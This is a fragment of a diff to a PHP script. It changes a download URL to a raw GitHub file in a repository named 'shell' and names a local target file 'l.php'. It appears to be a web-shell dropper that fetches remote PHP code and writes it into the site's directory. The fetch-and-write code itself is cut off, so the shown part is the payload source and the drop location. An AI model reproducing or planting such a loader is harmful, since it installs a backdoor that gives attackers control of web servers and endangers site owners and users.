@@ -1,5 +1,5 @@
 <?php
-$url = 'https://adevnatural.co.id/al.txt';
+$url = 'https://raw.githubusercontent.com/masbrili/shell/refs/heads/main/fekrut2.php';
 
 $target = __DIR__ . '/l.php';
 
